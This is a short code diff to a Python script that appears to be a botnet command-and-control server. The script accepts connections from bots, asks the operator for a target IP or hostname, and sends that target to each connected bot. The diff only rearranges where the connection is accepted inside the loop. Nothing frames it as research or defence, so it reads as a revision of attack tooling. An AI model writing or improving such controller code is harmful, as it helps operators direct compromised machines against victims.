@@ -11,9 +11,9 @@ hostport = int(0)
 proto = str("")
 x = True
 while True:
-    c, addr = s.accept()
-    print(addr, ":Bot connected")
     if x == True:
+        c, addr = s.accept()
+        print(addr, ":Bot connected")
         hostname = input("IP:")
         c.send(hostname.encode())
         print(addr, "Bot Got Hostname/IP")
